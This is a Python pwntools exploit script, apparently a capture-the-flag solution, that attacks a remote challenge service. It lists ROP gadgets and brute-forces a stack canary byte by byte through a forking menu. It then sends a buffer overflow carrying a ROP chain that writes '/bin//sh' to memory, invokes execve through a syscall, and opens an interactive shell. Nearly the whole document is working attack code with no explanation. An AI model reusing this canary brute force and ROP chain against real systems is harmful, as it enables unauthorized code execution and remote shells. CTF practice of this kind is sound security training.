from pwn import *

""" ROPGadgets

0x0000000000451064: push rsp; ret;
0x000000000042d6ce: push rdi; ret;
0x00000000004c2926: push rsi; ret;
0x00000000004d1ace: push rbp; ret;
0x000000000044b78f: push rbx; ret;

0x00000000004005cf: pop rax; ret;
0x0000000000400ad8: pop rbp; ret;
0x0000000000400f48: pop rbx; ret;
0x00000000004006c6: pop rdi; ret;
0x000000000044c2a6: pop rdx; ret;
0x0000000000410893: pop rsi; ret;
0x0000000000401f13: pop rsp; ret;

0x0000000000488931: mov qword ptr [rsi], rax; ret;
0x000000000044707b: mov qword ptr [rdi], rsi; ret;
0x0000000000435693: mov qword ptr [rdi], rdx; ret;
0x000000000043538b: mov qword ptr [rdi], rcx; ret;

0x0000000000422113: cdq; ret;

0x00000000004013ec: syscall;

ROPGadgets """


""" Values
0x68732f2f6e69622f:   "/bin//sh"   <- rdi
0x0000000000000000:   0             = rsi, rdx
0x000000000000003b:   59            = rax
Values """


# Initial payload setting
safe_stack_buf = b'a' * 24

canary = b""
canary_len = 0
byte_int_try = 0

cover_rbp = b'a' * 8

rop_chain = b""
rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
rop_chain += p64(0x68732f2f6e69622f) # var:("/bin//sh")
rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
rop_chain += p64(0x00000000006d2000) # var:(@.data)
rop_chain += p64(0x0000000000435693) # -> mov qword ptr [rdi], rdx; ret;
rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
rop_chain += p64(0x0000000000000000) # var:(0)
rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
rop_chain += p64(0x0000000000000000) # var:(0)
rop_chain += p64(0x00000000004005cf) # -> pop rax; ret;
rop_chain += p64(0x000000000000003b) # var:(59)
rop_chain += p64(0x00000000004013ec) # -> syscall;


# Start process
p = remote("ctf.adl.tw", 10011)


# Stop there and attached with gdb
# raw_input() # In python standard library, used for wating input


# Brute-Forcing Canary
while True:

    byte_try = byte_int_try.to_bytes(1, byteorder="little")

    p.recvuntil(b"3. stop create child and get out")
    p.send(b'1\n')

    p.recvuntil(b"father\n")
    p.send(safe_stack_buf + canary + byte_try)
    
    line = p.recvline().decode('utf-8').strip()

    if "stack smashing detected" in line:
        byte_int_try += 1
    else:
        canary += byte_try
        canary_len += 1
        print(str(canary_len) + " byte OK!")
        byte_int_try = 0

    if canary_len == 8:
        break

print(canary.decode('latin-1').encode('unicode-escape').decode('ascii'))

# Start to inject ROP
p.recvuntil(b"3. stop create child and get out")
p.send(b'3\n')

# raw_input() # In python standard library, used for wating input
payload = safe_stack_buf + canary + cover_rbp + rop_chain
p.recvuntil(b"Please help me find my children !!!!!\n")
# raw_input() # In python standard library, used for wating input
p.send(payload)

p.interactive()
